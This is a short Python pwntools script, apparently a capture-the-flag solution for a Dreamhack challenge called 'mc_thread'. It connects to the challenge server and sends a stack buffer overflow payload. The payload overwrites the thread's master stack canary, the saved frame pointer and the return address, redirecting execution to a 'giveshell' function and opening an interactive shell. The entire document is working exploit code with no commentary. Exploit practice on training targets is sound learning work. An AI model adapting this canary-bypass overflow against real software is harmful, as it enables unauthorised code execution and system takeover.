from pwn import *

p = remote("host3.dreamhack.games", 12008)
#p = process("./mc_thread")
e = ELF("./mc_thread")

giveshell = e.symbols['giveshell']

offset = 0x948

payload = b"A"*264
payload += b"B"*8 #master canary
payload += b"B"*8 #sfp
payload += p64(giveshell)
payload += b"C"*(offset - len(payload))
payload += b"B"*8

print(hex(len(payload)))
p.sendlineafter(b"Size: ", str(len(payload)).encode())
p.sendlineafter(b"Data: ", payload)

p.interactive()
